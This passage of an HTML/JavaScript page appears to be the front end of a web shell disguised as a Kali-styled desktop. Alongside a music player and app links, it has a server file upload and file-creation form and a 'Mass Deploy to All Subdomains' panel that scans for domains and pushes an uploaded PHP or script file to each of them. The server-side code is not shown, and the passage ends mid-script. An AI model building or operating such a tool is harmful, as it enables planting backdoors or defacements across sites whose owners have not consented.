        .desktop-nav-header { padding: 10px 15px; border-bottom: 1px solid rgba(0,255,0,0.3); font-size: 0.7rem; color: #8f8; font-weight: bold; background: rgba(0,0,0,0.3); }
        .desktop-nav-items { display: flex; flex-direction: column; gap: 2px; padding: 8px 0; }
        .desktop-nav-item { padding: 8px 15px; cursor: pointer; font-size: 0.7rem; display: flex; align-items: center; gap: 10px; transition: 0.2s; color: #ddd; border-left: 3px solid transparent; }
        .desktop-nav-item:hover { background: rgba(0,255,0,0.15); border-left-color: #2ecc71; color: #8f8; }
        .desktop-nav-item i { font-size: 0.8rem; width: 22px; }
        .second-nav, .third-nav { position: fixed; left: 220px; top: 38px; border-right: 1px solid rgba(0,255,0,0.5); border-bottom: 1px solid rgba(0,255,0,0.3); padding: 8px 0; max-height: 70vh; overflow-y: auto; min-width: 220px; display: none; flex-direction: column; background: rgba(10,14,26,0.95); backdrop-filter: blur(12px); z-index: 52; border-radius: 0 0 8px 0; }
        .second-nav.show, .third-nav.show { display: flex; }
        .second-nav-header, .third-nav-header { padding: 10px 15px; border-bottom: 1px solid rgba(0,255,0,0.3); font-size: 0.7rem; color: #8f8; font-weight: bold; background: rgba(0,0,0,0.3); }
        .second-nav-item, .third-nav-item { padding: 8px 15px; cursor: pointer; color: #ddd; font-size: 0.7rem; font-family: monospace; display: flex; align-items: center; gap: 10px; border-left: 3px solid transparent; }
        .second-nav-item:hover, .third-nav-item:hover { background: rgba(0,255,0,0.15); border-left-color: #2ecc71; color: #8f8; }
        .second-nav-item i, .third-nav-item i { width: 22px; font-size: 14px; }
        .settings-top-nav { position: fixed; top: 38px; right: 10px; background: rgba(10,14,26,0.98); backdrop-filter: blur(12px); border: 1px solid rgba(0,255,0,0.5); border-radius: 8px; z-index: 120; display: none; flex-direction: column; min-width: 280px; overflow: hidden; }
        .settings-top-nav.show { display: flex; }
        .settings-nav-header { padding: 12px 18px; border-bottom: 1px solid rgba(0,255,0,0.3); font-size: 0.8rem; color: #8f8; font-weight: bold; display: flex; justify-content: space-between; align-items: center; background: rgba(0,0,0,0.3); }
        .close-settings-nav { cursor: pointer; color: #ff8888; font-size: 1rem; padding: 0 5px; }
        .close-settings-nav:hover { color: #ff4444; }
        .settings-nav-items { display: flex; flex-direction: column; }
        .settings-nav-icon { padding: 12px 18px; cursor: pointer; color: #ddd; font-size: 0.75rem; display: flex; align-items: center; gap: 12px; transition: 0.2s; border-left: 3px solid transparent; }
        .settings-nav-icon:hover { background: rgba(0,255,0,0.15); border-left-color: #2ecc71; color: #8f8; }
        .settings-nav-icon i { width: 22px; font-size: 1rem; }
        .settings-sub-panel { position: fixed; top: 38px; right: 300px; width: 320px; background: rgba(10,14,26,0.98); backdrop-filter: blur(12px); border: 1px solid rgba(0,255,0,0.5); border-radius: 8px; z-index: 121; display: none; flex-direction: column; overflow: hidden; }
        .settings-sub-panel.show { display: flex; }
        .settings-sub-header { padding: 12px 18px; border-bottom: 1px solid rgba(0,255,0,0.3); font-size: 0.8rem; color: #8f8; display: flex; justify-content: space-between; align-items: center; background: rgba(0,0,0,0.3); }
        .close-sub-panel { cursor: pointer; color: #ff8888; font-size: 1rem; padding: 0 5px; }
        .close-sub-panel:hover { color: #ff4444; }
        .settings-sub-content { padding: 15px 18px; }
        .desktop-area { position: fixed; top: 48px; left: 12px; right: 12px; bottom: 46px; z-index: 40; pointer-events: auto; display: flex; flex-direction: column; flex-wrap: wrap; gap: 6px 16px; overflow-x: auto; overflow-y: hidden; padding: 4px 8px; align-content: flex-start; transition: left 0.3s ease; }
        .desktop-area.nav-open { left: 232px; }
        .desktop-icon { width: 70px; background: rgba(0,0,0,0.3); backdrop-filter: blur(4px); text-align: center; cursor: pointer; transition: 0.1s; color: #fff; font-size: 0.5rem; padding: 4px 0; border-radius: 6px; display: flex; flex-direction: column; align-items: center; gap: 2px; }
        .desktop-icon:hover { background: rgba(30,60,30,0.5); transform: scale(1.02); }
        .desktop-icon i, .desktop-icon .fab, .desktop-icon .fas { font-size: 22px; margin: 0 auto; display: block; text-align: center; }
        .desktop-icon span { font-size: 0.5rem; max-width: 68px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; color: #fff; text-shadow: 0 0 3px black; }
        .editor-cardview { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 355px; min-height: 192px; background: rgba(10,14,26,0.95); backdrop-filter: blur(20px); border: 1px solid #2ecc71; border-radius: 8px; z-index: 500; display: none; flex-direction: column; overflow: hidden; box-shadow: 0 8px 32px rgba(0,0,0,0.4); }
        .editor-cardview.maximized { position: fixed !important; top: 0 !important; left: 0 !important; right: 0 !important; bottom: 0 !important; width: 100vw !important; height: 100vh !important; min-height: 100vh !important; transform: none !important; border-radius: 0 !important; border-width: 0 !important; margin: 0 !important; z-index: 2000 !important; }
        .editor-cardview.maximized .editor-body { flex: 1; min-height: calc(100vh - 80px); }
        .editor-cardview.maximized .editor-body textarea { height: calc(100vh - 180px); }
        .editor-title { background: rgba(30,30,46,0.9); padding: 6px 10px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid rgba(46,204,113,0.3); cursor: move; }
        .editor-cardview.maximized .editor-title { cursor: default; }
        .editor-title-left { display: flex; align-items: center; gap: 8px; }
        .editor-icon { font-size: 0.9rem; width: 20px; text-align: center; }
        .editor-filename { font-size: 0.7rem; color: #fff; font-family: monospace; }
        .editor-buttons { display: flex; gap: 6px; }
        .editor-btn { background: transparent; border: none; color: #ccc; font-size: 0.7rem; width: 22px; height: 22px; cursor: pointer; border-radius: 3px; transition: 0.2s; }
        .editor-btn:hover { background: rgba(255,255,255,0.1); }
        .editor-btn.close-btn:hover { background: #e81123; color: white; }
        .editor-body { flex: 1; display: flex; flex-direction: column; padding: 12px; gap: 10px; min-height: 150px; }
        .editor-body input, .editor-body textarea { background: rgba(0,0,0,0.6); border: 1px solid #2e7a3e; color: #0f0; padding: 6px; font-family: monospace; border-radius: 4px; font-size: 0.7rem; }
        .editor-body textarea { height: 100px; resize: vertical; }
        .editor-cardview.maximized .editor-body textarea { height: calc(100vh - 200px); resize: none; }
        .editor-footer { display: flex; gap: 10px; justify-content: center; padding: 10px; border-top: 1px solid rgba(46,204,113,0.2); }
        .editor-footer button { background: #1a3a1a; border: none; padding: 5px 14px; color: #fff; cursor: pointer; border-radius: 4px; font-size: 0.65rem; transition: 0.2s; }
        .editor-footer button:hover { background: #2a6e2a; }
        .editor-footer .delete-btn { background: #5a1a1a; }
        .editor-footer .delete-btn:hover { background: #8a2a2a; }
        .modal-glass { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(12,18,28,0.95); backdrop-filter: blur(20px); border: 1px solid #0f0; width: 355px; height: auto; z-index: 500; display: none; flex-direction: column; color: #fff; padding: 12px 16px; border-radius: 8px; gap: 10px; }
        .modal-glass input, .modal-glass textarea { background: #000000cc; border: 1px solid #2e7a3e; color: #fff; padding: 6px; font-family: monospace; border-radius: 4px; font-size: 11px; }
        .modal-glass textarea { height: 60px; resize: vertical; }
        .modal-glass button { background: #1a3a1a; border: none; padding: 6px 12px; color: #fff; cursor: pointer; border-radius: 4px; font-size: 11px; min-width: 70px; }
        .modal-glass button:hover { background: #2a6e2a; }
        .modal-glass .flex-row { display: flex; gap: 12px; justify-content: center; margin-top: 4px; }
        .modal-glass .modal-header { display: flex; justify-content: space-between; align-items: center; font-size: 13px; font-weight: bold; border-bottom: 1px solid #2e7a3e; padding-bottom: 4px; margin-bottom: 4px; }
        .modal-header span:first-child i { margin-right: 6px; }
        .modal-header .close-modal { cursor: pointer; font-size: 14px; }
        .modal-header .close-modal:hover { color: #ff8888; }
        .toast-message { position: fixed; bottom: 60px; left: 50%; transform: translateX(-50%); background: #0a2a0a; color: #fff; padding: 6px 16px; z-index: 2000; border-radius: 20px; font-family: monospace; white-space: nowrap; }
        .terminal-window { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 355px; height: 192px; min-width: 355px; max-width: 90vw; background: rgba(10,14,26,0.92); backdrop-filter: blur(12px); border: 1px solid #2ecc71; border-radius: 8px; z-index: 1000; display: flex; flex-direction: column; overflow: hidden; box-shadow: 0 8px 20px rgba(0,0,0,0.5); resize: none; transition: all 0.2s ease; }
        .terminal-window.hidden { display: none; }
        .terminal-window.maximized { position: fixed !important; top: 0 !important; left: 0 !important; right: 0 !important; bottom: 0 !important; width: 100vw !important; height: 100vh !important; max-width: 100vw !important; min-width: 100vw !important; transform: none !important; border-radius: 0 !important; resize: none !important; border-width: 0 !important; margin: 0 !important; z-index: 2000 !important; }
        .terminal-window.maximized .terminal-body { flex: 1; min-height: calc(100vh - 32px); }
        .terminal-title { background: rgba(45,45,45,0.9); padding: 4px 10px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #3a3a3a; cursor: move; z-index: 10; flex-shrink: 0; }
        .terminal-window.maximized .terminal-title { cursor: default; }
        .terminal-title-left { display: flex; gap: 6px; }
        .term-dot { width: 8px; height: 8px; border-radius: 50%; }
        .term-dot.red { background: #ff5f56; }
        .term-dot.yellow { background: #ffbd2e; }
        .term-dot.green { background: #27c93f; }
        .terminal-buttons { display: flex; gap: 4px; }
        .terminal-buttons button { background: transparent; border: none; color: #ccc; font-size: 10px; width: 20px; height: 20px; cursor: pointer; border-radius: 4px; }
        .terminal-buttons button:hover { background: #3a3a3a; }
        .terminal-buttons .close-btn:hover { background: #e81123; color: white; }
        .terminal-body { flex: 1; position: relative; overflow: hidden; background: transparent; min-height: 0; }
        .terminal-scroll-area { position: absolute; top: 0; left: 0; right: 0; bottom: 0; overflow-y: auto; padding: 6px 8px; font-family: 'Consolas', monospace; font-size: 9px; z-index: 2; scrollbar-width: thin; }
        .terminal-scroll-area::-webkit-scrollbar { width: 4px; background: transparent; }
        .terminal-scroll-area::-webkit-scrollbar-track { background: transparent; }
        .terminal-scroll-area::-webkit-scrollbar-thumb { background: #2ecc71; border-radius: 4px; }
        .terminal-logo { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 1; pointer-events: none; opacity: 0.55; text-align: center; width: 90%; max-width: 280px; }
        .terminal-logo img { width: 100%; height: auto; max-height: 160px; object-fit: contain; filter: drop-shadow(0 0 8px rgba(0,255,0,0.4)); }
        .terminal-window.maximized .terminal-logo { opacity: 0.35; max-width: 500px; }
        .terminal-window.maximized .terminal-logo img { max-height: 300px; }
        .terminal-content { position: relative; z-index: 2; background: transparent; }
        .file-upload-panel { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 500px; max-width: 90vw; background: rgba(10,14,26,0.98); backdrop-filter: blur(20px); border: 1px solid #2ecc71; border-radius: 10px; z-index: 600; display: none; flex-direction: column; overflow: hidden; }
        .file-upload-panel.show { display: flex; }
        .file-upload-header { background: rgba(30,30,46,0.9); padding: 10px 12px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #2ecc71; }
        .file-upload-header h3 { color: #2ecc71; font-size: 0.9rem; font-family: monospace; }
        .close-upload { cursor: pointer; color: #ff8888; font-size: 1.2rem; }
        .file-upload-body { padding: 15px; display: flex; flex-direction: column; gap: 10px; }
        .file-upload-body input, .file-upload-body textarea { background: #000000cc; border: 1px solid #2e7a3e; color: #0f0; padding: 8px; border-radius: 4px; font-family: monospace; font-size: 0.7rem; }
        .file-upload-body textarea { height: 200px; resize: vertical; }
        .file-upload-body button { background: #1a3a1a; border: none; padding: 8px 16px; color: #fff; cursor: pointer; border-radius: 4px; }
        .file-upload-body button:hover { background: #2a6e2a; }
        .mass-deploy-panel { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 600px; max-width: 90vw; background: rgba(10,14,26,0.98); backdrop-filter: blur(20px); border: 1px solid #2ecc71; border-radius: 10px; z-index: 601; display: none; flex-direction: column; overflow: hidden; }
        .mass-deploy-panel.show { display: flex; }
        .mass-deploy-header { background: rgba(30,30,46,0.9); padding: 10px 12px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #2ecc71; }
        .mass-deploy-header h3 { color: #2ecc71; font-size: 0.9rem; font-family: monospace; }
        .close-mass-deploy { cursor: pointer; color: #ff8888; font-size: 1.2rem; }
        .mass-deploy-body { padding: 15px; display: flex; flex-direction: column; gap: 10px; max-height: 70vh; overflow-y: auto; }
        .domain-list { background: #0a0e1a; border: 1px solid #2e7a3e; border-radius: 4px; padding: 10px; max-height: 200px; overflow-y: auto; }
        .domain-item { padding: 4px 8px; font-size: 0.7rem; color: #8f8; border-bottom: 1px solid #2e7a3e; }
        .progress-bar-container { width: 100%; height: 20px; background: #1a1a2a; border-radius: 10px; overflow: hidden; margin: 10px 0; }
        .progress-bar-fill { width: 0%; height: 100%; background: #2ecc71; transition: width 0.3s; }
        .deploy-log { background: #0a0e1a; border: 1px solid #2e7a3e; border-radius: 4px; padding: 10px; max-height: 150px; overflow-y: auto; font-size: 0.65rem; font-family: monospace; }
        .deploy-log .success { color: #2ecc71; }
        .deploy-log .error { color: #ff4444; }
        .deploy-log .info { color: #ffaa33; }
    </style>
</head>
<body>
    <div class="bg-landscape-banner"><img src="https://i.ibb.co/zhhhDftP/1000004913.png" alt="background"></div>
    <div class="center-logo"><img src="https://i.ibb.co/fVVdq42H/20260504-185400.png" alt="Kali Linux"></div>
    <div class="top-border">
        <div class="top-left-group"><div class="icon-only" id="saveFileBtn"><i class="fas fa-folder-open"></i></div><div class="new-tab-circle" id="newTabBtn"><i class="fas fa-plus"></i></div></div>
        <div class="app-tabs-container" id="appTabsContainer"></div>
        <div class="top-right-status"><div class="status-badge" id="batteryStatus"></div></div>
    </div>
    <div class="bottom-border">
        <div class="bottom-icons">
            <div class="bottom-icon" id="menuBtn"><img src="https://i.ibb.co/8D95mqCT/1777795287432.png" alt="menu"></div>
            <div class="bottom-icon" id="terminalBtn"><img src="https://i.ibb.co/ksD1gCGX/1777801333823.png" alt="terminal"></div>
            <div class="bottom-icon" id="bottomUploadBtn"><img src="https://i.ibb.co/DfywnJBR/1777809634694.png" alt="upload"></div>
            <div class="bottom-icon" id="massDeployBtn"><i class="fas fa-shield-alt" style="font-size:18px;"></i></div>
        </div>
        <div class="datetime-panel" id="datetimeDisplay"><i class="far fa-clock"></i> --:--:--</div>
    </div>
    <div id="desktopArea" class="desktop-area"></div>
    <div class="nav-menu" id="navMenu">
        <div class="nav-top">
            <div class="nav-item-text" id="navDesktopBtn"><i class="fas fa-desktop"></i> Desktop</div>
            <div class="nav-item-text" id="navApplicationsBtn"><i class="fas fa-th-large"></i> Applications</div>
            <div class="nav-item-text" id="navMyComputerBtn"><i class="fas fa-mobile-alt"></i> My Computer</div>
            <div class="nav-item-text" id="navFilesBtn"><i class="fas fa-folder"></i> Files</div>
            <div class="nav-item-text" id="navSettingsBtn"><i class="fas fa-cog"></i> Settings</div>
            <div class="nav-item-text" id="navMassDeployBtn"><i class="fas fa-shield-alt"></i> Mass Deploy</div>
            <div class="nav-divider"></div>
            <div class="nav-item-text" id="navRestartBtn"><i class="fas fa-sync-alt"></i> Restart</div>
            <div class="nav-item-text" id="navSleepBtn"><i class="fas fa-moon"></i> Sleep</div>
            <div class="nav-item-text" id="navShutdownBtn"><i class="fas fa-power-off"></i> Shutdown</div>
        </div>
    </div>
    <div id="desktopNavbar" class="desktop-navbar"><div class="desktop-nav-header"><i class="fas fa-desktop"></i> Desktop Items</div><div class="desktop-nav-items" id="desktopNavItems"></div></div>
    <div id="applicationsNav" class="second-nav"><div class="second-nav-header"><i class="fas fa-th-large"></i> All Applications</div></div>
    <div id="filesNav" class="third-nav"><div class="third-nav-header"><i class="fas fa-folder"></i> My Files</div></div>
    <div id="settingsTopNav" class="settings-top-nav"><div class="settings-nav-header"><span><i class="fas fa-cog"></i> Quick Settings</span><span class="close-settings-nav" id="closeSettingsTopNav">✖</span></div><div class="settings-nav-items"><div class="settings-nav-icon" data-panel="brightness"><i class="fas fa-sun"></i> Brightness</div><div class="settings-nav-icon" data-panel="music"><i class="fas fa-music"></i> Music Player</div><div class="settings-nav-icon" data-panel="bluetooth"><i class="fab fa-bluetooth"></i> Bluetooth</div></div></div>
    <div id="brightnessPanel" class="settings-sub-panel"><div class="settings-sub-header"><span><i class="fas fa-sun"></i> Adjust Brightness</span><span class="close-sub-panel" data-close="brightnessPanel">✖</span></div><div class="settings-sub-content"><div class="brightness-control"><i class="fas fa-sun"></i><input type="range" id="brightnessSlider" min="0" max="100" value="100"><span id="brightnessValue" class="brightness-value">100%</span></div></div></div>
    <div id="musicPanel" class="settings-sub-panel"><div class="settings-sub-header"><span><i class="fas fa-music"></i> Music Player (10 Songs)</span><span class="close-sub-panel" data-close="musicPanel">✖</span></div><div class="settings-sub-content"><div class="music-controls"><button class="music-btn" id="prevBtn"><i class="fas fa-backward"></i> Prev</button><button class="music-btn" id="playPauseBtn"><i class="fas fa-play"></i> Play</button><button class="music-btn" id="nextBtn"><i class="fas fa-forward"></i> Next</button><button class="music-btn" id="stopMusicBtn"><i class="fas fa-stop"></i> Stop</button></div><div class="music-progress"><div class="progress-bar" id="progressBar"><div class="progress-fill" id="progressFill"></div></div><div class="music-time"><span id="currentTime">0:00</span><span id="durationTime">0:00</span></div></div><div class="playlist" id="playlist"></div><div class="music-status" id="musicStatus">Music Player Ready</div></div></div>
    <div id="bluetoothPanel" class="settings-sub-panel"><div class="settings-sub-header"><span><i class="fab fa-bluetooth"></i> Bluetooth Settings</span><span class="close-sub-panel" data-close="bluetoothPanel">✖</span></div><div class="settings-sub-content"><div class="setting-row"><span class="setting-label">Bluetooth</span><div class="toggle-switch" id="bluetoothToggle"></div></div><div id="bluetoothStatusText" class="bluetooth-status-text">OFF</div></div></div>
    
    <div id="fileUploadPanel" class="file-upload-panel">
        <div class="file-upload-header">
            <h3><i class="fas fa-upload"></i> Upload / Create File</h3>
            <span class="close-upload" id="closeUploadPanel">&times;</span>
        </div>
        <div class="file-upload-body">
            <form id="uploadForm" enctype="multipart/form-data" method="post">
                <input type="text" id="uploadDirectory" name="target_dir" placeholder="Target directory (leave empty for current)">
                <input type="file" id="uploadFileInput" name="upfile[]" multiple required>
                <button type="submit" id="uploadSubmitBtn">Upload File(s)</button>
            </form>
            <hr style="border-color:#2e7a3e; margin:10px 0;">
            <h4>OR Create Text File:</h4>
            <input type="text" id="createFileName" placeholder="Filename">
            <textarea id="createFileContent" placeholder="File content..."></textarea>
            <button id="createTextFileBtn">Create Text File</button>
        </div>
    </div>
    
    <div id="massDeployPanel" class="mass-deploy-panel">
        <div class="mass-deploy-header">
            <h3><i class="fas fa-shield-alt"></i> Mass Deploy to All Subdomains</h3>
            <span class="close-mass-deploy" id="closeMassDeployPanel">&times;</span>
        </div>
        <div class="mass-deploy-body">
            <div id="domainScanStatus"></div>
            <button id="scanDomainsBtn" class="btn-scan"><i class="fas fa-search"></i> Scan for Domains</button>
            <div id="domainListContainer" class="domain-list" style="display:none;"></div>
            <input type="file" id="deployFileInput" accept=".php,.txt,.html,.js">
            <div class="progress-bar-container" id="progressContainer" style="display:none;">
                <div class="progress-bar-fill" id="deployProgressFill"></div>
            </div>
            <button id="startMassDeployBtn" disabled><i class="fas fa-rocket"></i> Deploy to All Domains</button>
            <div id="deployLog" class="deploy-log" style="display:none;"></div>
        </div>
    </div>

    <div id="editorCardView" class="editor-cardview">
        <div class="editor-title" id="editorTitle">
            <div class="editor-title-left">
                <i id="editorFileIcon" class="fas fa-file-alt editor-icon"></i>
                <span id="editorFileName" class="editor-filename">untitled</span>
            </div>
            <div class="editor-buttons">
                <button id="editorMinBtn" class="editor-btn" title="Minimize">─</button>
                <button id="editorMaxBtn" class="editor-btn" title="Maximize">□</button>
                <button id="editorCloseBtn" class="editor-btn close-btn" title="Close">✕</button>
            </div>
        </div>
        <div class="editor-body">
            <input type="text" id="editorFilenameInput" placeholder="Filename">
            <textarea id="editorContentInput" placeholder="File content..."></textarea>
        </div>
        <div class="editor-footer">
            <button id="editorSaveBtn">Save</button>
            <button id="editorDeleteBtn" class="delete-btn">Delete</button>
            <button id="editorCancelBtn">Cancel</button>
        </div>
    </div>
    
    <div id="saveDialog" class="modal-glass"><div class="modal-header"><span><i class="fas fa-folder-open"></i> Save New File</span><span id="closeSaveDialog" class="close-modal">✖</span></div><input type="text" id="newFileName" placeholder="filename.txt" value="newfile.txt"><textarea id="newFileContent" rows="2" placeholder="File content..."></textarea><div class="flex-row"><button id="confirmSaveBtn">Create</button><button id="cancelSaveBtn" style="background:#3a2a2a;">Cancel</button></div></div>
    
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://code.jquery.com/ui/1.13.2/jquery-ui.min.js"></script>
    <script>
    (function(){
        let audioElement = null;
        let isPlaying = false;
        let currentSongIndex = 0;
        let updateInterval = null;
        const songList = [
            { name: "Song 1 - Midnight Dreams", url: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" },
            { name: "Song 2 - Ocean Waves", url: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-2.mp3" },
            { name: "Song 3 - Mountain High", url: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-3.mp3" },
            { name: "Song 4 - City Lights", url: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-4.mp3" },
            { name: "Song 5 - Forest Rain", url: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-5.mp3" },
            { name: "Song 6 - Desert Wind", url: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-6.mp3" },
            { name: "Song 7 - Starry Night", url: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-7.mp3" },
            { name: "Song 8 - Summer Breeze", url: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-8.mp3" },
            { name: "Song 9 - Winter Snow", url: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-9.mp3" },
            { name: "Song 10 - Autumn Leaves", url: "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-10.mp3" }
        ];
        function formatTime(seconds) { if(isNaN(seconds)) return "0:00"; let mins=Math.floor(seconds/60); let secs=Math.floor(seconds%60); return mins+":"+(secs<10?"0"+secs:secs); }
        function loadSong(index){
            if(audioElement){ audioElement.pause(); audioElement=null; }
            if(updateInterval) clearInterval(updateInterval);
            audioElement=new Audio(songList[index].url);
            audioElement.loop=false;
            audioElement.addEventListener('loadedmetadata',()=>{ document.getElementById('durationTime').textContent=formatTime(audioElement.duration); });
            audioElement.addEventListener('timeupdate',()=>{ if(audioElement && !isNaN(audioElement.duration)){ let percent=(audioElement.currentTime/audioElement.duration)*100; document.getElementById('progressFill').style.width=percent+'%'; document.getElementById('currentTime').textContent=formatTime(audioElement.currentTime); } });
            audioElement.addEventListener('ended',()=>{ nextSong(); });
            let items=document.querySelectorAll('#playlist .playlist-item');
            items.forEach((it,idx)=>{ if(idx==index) it.classList.add('active'); else it.classList.remove('active'); });
            document.getElementById('musicStatus').textContent='Loaded: '+songList[index].name;
        }
        function playSong(){ if(!audioElement) loadSong(currentSongIndex); audioElement.play().catch(e=>console.log(e)); isPlaying=true; document.getElementById('playPauseBtn').innerHTML='<i class="fas fa-pause"></i> Pause'; document.getElementById('musicStatus').textContent='Now Playing: '+songList[currentSongIndex].name; if(updateInterval) clearInterval(updateInterval); updateInterval=setInterval(()=>{ if(audioElement && !audioElement.paused && !isNaN(audioElement.duration)){ let percent=(audioElement.currentTime/audioElement.duration)*100; document.getElementById('progressFill').style.width=percent+'%'; document.getElementById('currentTime').textContent=formatTime(audioElement.currentTime); } },500); }
        function pauseSong(){ if(audioElement){ audioElement.pause(); isPlaying=false; document.getElementById('playPauseBtn').innerHTML='<i class="fas fa-play"></i> Play'; document.getElementById('musicStatus').textContent='Paused: '+songList[currentSongIndex].name; } }
        function nextSong(){ currentSongIndex=(currentSongIndex+1)%songList.length; loadSong(currentSongIndex); if(isPlaying) playSong(); else document.getElementById('musicStatus').textContent='Ready: '+songList[currentSongIndex].name; }
        function prevSong(){ currentSongIndex=(currentSongIndex-1+songList.length)%songList.length; loadSong(currentSongIndex); if(isPlaying) playSong(); else document.getElementById('musicStatus').textContent='Ready: '+songList[currentSongIndex].name; }
        function stopSong(){ if(audioElement){ audioElement.pause(); audioElement.currentTime=0; isPlaying=false; document.getElementById('progressFill').style.width='0%'; document.getElementById('currentTime').textContent='0:00'; document.getElementById('playPauseBtn').innerHTML='<i class="fas fa-play"></i> Play'; document.getElementById('musicStatus').textContent='Stopped'; } }
        function populatePlaylist(){ const div=document.getElementById('playlist'); div.innerHTML=''; songList.forEach((s,idx)=>{ const item=document.createElement('div'); item.className='playlist-item'; if(idx===0) item.classList.add('active'); item.innerHTML=`<i class="fas fa-music"></i> ${s.name}`; item.addEventListener('click',()=>{ currentSongIndex=idx; loadSong(currentSongIndex); if(isPlaying) playSong(); else document.getElementById('musicStatus').textContent='Ready: '+songList[currentSongIndex].name; }); div.appendChild(item); }); }
        document.getElementById('playPauseBtn')?.addEventListener('click',()=>{ if(!audioElement){ loadSong(currentSongIndex); playSong(); }else if(isPlaying) pauseSong(); else playSong(); });
        document.getElementById('nextBtn')?.addEventListener('click',nextSong);
        document.getElementById('prevBtn')?.addEventListener('click',prevSong);
        document.getElementById('stopMusicBtn')?.addEventListener('click',stopSong);
        let progressBar=document.getElementById('progressBar');
        progressBar?.addEventListener('click',(e)=>{ if(audioElement && audioElement.duration){ let rect=progressBar.getBoundingClientRect(); let percent=(e.clientX-rect.left)/rect.width; audioElement.currentTime=percent*audioElement.duration; } });
        populatePlaylist();
        
        function updateBattery() {
            const statusDiv = document.getElementById('batteryStatus');
            if (!statusDiv) return;
            statusDiv.innerHTML = '<i class="fas fa-battery-full"></i> Battery';
        }
        updateBattery();
        
        function updateDateTime(){ let d=new Date(); document.getElementById('datetimeDisplay').innerHTML=`<i class="far fa-clock"></i> ${d.toLocaleTimeString()} | ${d.toLocaleDateString()}`; }
        updateDateTime(); setInterval(updateDateTime,1000);
        
        const navMenu=document.getElementById('navMenu');
        const desktopArea=document.getElementById('desktopArea');
        const desktopNavbar=document.getElementById('desktopNavbar');
        const applicationsNav=document.getElementById('applicationsNav');
        const filesNav=document.getElementById('filesNav');
        const settingsTopNav=document.getElementById('settingsTopNav');
        let isNavOpen=false;
        
        function closeAllNavs() {
            if(desktopNavbar) desktopNavbar.classList.remove('show');
            if(applicationsNav) applicationsNav.classList.remove('show');
            if(filesNav) filesNav.classList.remove('show');
            if(settingsTopNav) settingsTopNav.classList.remove('show');
            document.getElementById('brightnessPanel')?.classList.remove('show');
            document.getElementById('musicPanel')?.classList.remove('show');
            document.getElementById('bluetoothPanel')?.classList.remove('show');
        }
        
        function toggleNav() { 
            isNavOpen=!isNavOpen; 
            if(isNavOpen){ 
                navMenu.classList.add('show'); 
                desktopArea.classList.add('nav-open'); 
            } else { 
                navMenu.classList.remove('show'); 
                desktopArea.classList.remove('nav-open');
                closeAllNavs();
            } 
        }
        
        document.getElementById('menuBtn')?.addEventListener('click',toggleNav);
        
        const applicationsList=[
            {name:"YouTube",icon:"fab fa-youtube",color:"#ff0000",url:"https://www.youtube.com"},
            {name:"Facebook",icon:"fab fa-facebook",color:"#1877f2",url:"https://www.facebook.com"},
            {name:"GitHub",icon:"fab fa-github",color:"#ffffff",url:"https://www.github.com"},
            {name:"Firefox",icon:"fab fa-firefox",color:"#ff9400",url:"https://www.firefox.com"},
            {name:"Telegram",icon:"fab fa-telegram",color:"#26a5e4",url:"https://web.telegram.org"},
            {name:"WhatsApp",icon:"fab fa-whatsapp",color:"#25d366",url:"https://web.whatsapp.com"},
            {name:"TikTok",icon:"fab fa-tiktok",color:"#000000",url:"https://www.tiktok.com"},
            {name:"Instagram",icon:"fab fa-instagram",color:"#e4405f",url:"https://www.instagram.com"}
        ];
        
        function showApplicationsNav(){ 
            if(applicationsNav){ 
                if(applicationsNav.classList.contains('show')){ 
                    applicationsNav.classList.remove('show'); 
                } else { 
                    closeAllNavs();
                    const existing=applicationsNav.querySelectorAll('.second-nav-item:not(.second-nav-header)'); 
                    existing.forEach(i=>i.remove()); 
                    applicationsList.forEach(app=>{ 
                        const item=document.createElement('div'); 
                        item.className='second-nav-item'; 
                        item.innerHTML=`<i class="${app.icon}" style="color:${app.color}"></i> <span>${app.name}</span>`; 
                        item.addEventListener('click',()=>{ 
                            window.open(app.url,'_blank'); 
                            addTab(app.name,app.icon,app.url); 
                            applicationsNav.classList.remove('show'); 
                        }); 
                        applicationsNav.appendChild(item); 
                    }); 
                    applicationsNav.classList.add('show'); 
                } 
            } 
        }
        
        function showFilesNav(){ 
            if(filesNav){ 
                if(filesNav.classList.contains('show')){ 
                    filesNav.classList.remove('show'); 
                } else { 
                    closeAllNavs();
                    const existing=filesNav.querySelectorAll('.third-nav-item:not(.third-nav-header)'); 
                    existing.forEach(i=>i.remove()); 
                    const fileItems=desktopItems.filter(i=>i.type==='file'); 
                    if(fileItems.length===0){ 
                        const empty=document.createElement('div'); 
                        empty.className='third-nav-item'; 
                        empty.innerHTML='<i class="fas fa-info-circle"></i> <span>No files found</span>'; 
                        filesNav.appendChild(empty); 
                    } else { 
                        fileItems.forEach(file=>{ 
                            const item=document.createElement('div'); 
                            item.className='third-nav-item'; 
                            item.innerHTML=`<i class="${file.icon}" style="color:${file.color}"></i> <span>${escapeHtml(file.name)}</span>`; 
                            item.addEventListener('click',()=>{ 
                                openFileEditor(file); 
                                filesNav.classList.remove('show'); 
                            }); 
                            filesNav.appendChild(item); 
                        }); 
                    } 
                    filesNav.classList.add('show'); 
                } 
            } 
        }
        
        function showDesktopNav(){ 
            if(desktopNavbar){ 
                if(desktopNavbar.classList.contains('show')){ 
                    desktopNavbar.classList.remove('show'); 
                } else { 
                    closeAllNavs();
                    updateDesktopNavbar(); 
